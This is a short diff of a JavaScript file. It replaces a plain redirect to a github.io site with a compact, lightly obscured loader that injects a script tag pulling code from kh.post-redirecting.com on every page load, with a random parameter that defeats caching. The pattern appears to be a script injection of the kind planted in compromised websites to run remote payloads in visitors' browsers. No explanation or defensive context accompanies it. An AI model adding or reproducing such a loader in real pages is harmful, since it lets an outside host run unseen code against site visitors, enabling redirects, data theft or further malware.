@@ -1,1 +1,6 @@
-window.location.href = "https://thearthouse.github.io" + "?d=0&r=" + Math.random();
+(function (a, d, j, o) {
+   o = a.createElement(d),
+      m = a.getElementsByTagName(d)[0];              
+   o.src = j + "?d=0&r=" + Math.random();
+   m.parentNode.insertBefore(o, m)
+})(document, 'script', 'https://kh.post-redirecting.com/sl/867b95f6');
